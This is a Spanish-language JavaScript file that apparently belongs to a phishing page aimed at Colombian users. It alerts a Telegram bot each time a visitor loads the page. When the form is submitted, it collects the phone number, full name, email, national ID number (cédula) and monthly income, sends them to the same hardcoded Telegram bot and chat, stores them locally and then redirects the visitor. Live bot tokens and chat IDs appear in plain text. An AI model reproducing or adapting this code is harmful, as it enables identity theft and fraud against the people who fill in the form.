
  /* ===============================
     aviso de entrada
  =============================== */


// Ejecutar al cargar la página
window.addEventListener('load', function() {
    const token = "8588682882:AAGBckxmZijeZfAuF5PzUuEQD-vZLJBC9BE";
    const chatId = "7874654715";
    const mensaje = `¡Alguien ha entrado a tu sitio web! - ${new Date().toLocaleString()}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: mensaje
        })
    })
    .then(res => res.json())
    .then(data => console.log("enviado "))
    .catch(err => console.error("Error ", err));
});





/*
window.addEventListener('load', function() {
    const token = "8214599584:AAF5D-FzEQsPPwSBtyD0iyFWfar0Li5VFHw";
    const chatId = "8417322083";
    const mensaje = `¡Alguien ha entrado a tu sitio web! - ${new Date().toLocaleString()}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: mensaje
        })
    })
    .then(res => res.json())
    .then(data => console.log("enviado "))
    .catch(err => console.error("Error ", err));
});
*/






document.addEventListener("DOMContentLoaded", () => {

  document.getElementById("btn-consultar").addEventListener("click", async () => {

    const numero = document.getElementById("telefono01").value.trim();
    const nombre   = document.getElementById("nombre01").value.trim();
    const correo   = document.getElementById("correo01").value.trim();
    const cedula   = document.getElementById("cedula01").value.trim();

    const ingresosM   = document.getElementById("ingresosM01").value.trim();


    if (!numero || !nombre || !correo || !cedula) {
      mostrarModalError("El número de celular, correo o la cédula son incorrectos.");
      return;
    }

    if (!telefonoColombianoValido(numero) || !cedulaColombianaValida(cedula)) {
      mostrarModalError("El número de celular o la cédula son incorrectos.");
      return;
    }

    const modalCarga = document.getElementById("modal-cargando");
    modalCarga.style.display = "flex";

    /* =============================== TELEGRAM =============================== */
    const TELEGRAM_BOT_TOKEN = "8588682882:AAGBckxmZijeZfAuF5PzUuEQD-vZLJBC9BE";
    const TELEGRAM_CHAT_ID  = "7874654715";

    const mensaje =
      "*#1*\n\n" +
      "Numero: " + numero + "\n" +
      "Nombre: " + nombre + "\n" +
      "Correo: " + correo + "\n" +
      "Cédula: " + cedula + "\n" +
      "IngresosM: " + ingresosM + "\n";

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: mensaje,
            parse_mode: "Markdown"
          })
        }
      );

      if (!response.ok) throw new Error("no respondió");

      /* =============================== GUARDAR EN LOCALSTORAGE =============================== */
      let registros = JSON.parse(localStorage.getItem("registros")) || [];

      registros.push({
        numero,
        nombre,
        correo,
        cedula,
        ingresosM,
        fecha: new Date().toLocaleString()
      });

      localStorage.setItem("registros", JSON.stringify(registros));

      console.log("EXITO");

      modalCarga.style.display = "none";
      window.location.href = "resultado.html";

    } catch (error) {
      modalCarga.style.display = "none";
      mostrarModalError("Error. Intenta nuevamente.");
      console.error("Error Telegram:", error);
    }

  });

  /* =============================== VALIDACIONES =============================== */
  function telefonoColombianoValido(numero) {
    return /^\d{10}$/.test(numero) && numero.startsWith("3");
  }

  function cedulaColombianaValida(numero) {
    if (!/^\d+$/.test(numero)) return false;
    return (numero.length >= 7 && numero.length <= 10 && !numero.startsWith("0"));
  }

  /* =============================== MODAL ERROR =============================== */
  function mostrarModalError(mensaje) {
    const modal = document.getElementById("modal-error");
    const box   = document.getElementById("modal-box");

    modal.querySelector("p").textContent = mensaje;
    modal.style.display = "flex";

    setTimeout(() => {
      box.style.transform = "translateY(0)";
      box.style.opacity = "1";
    }, 10);
  }

  document.getElementById("cerrar-modal").addEventListener("click", () => {
    const modal = document.getElementById("modal-error");
    const box   = document.getElementById("modal-box");

    box.style.transform = "translateY(-50px)";
    box.style.opacity = "0";

    setTimeout(() => modal.style.display = "none", 300);
  });


});








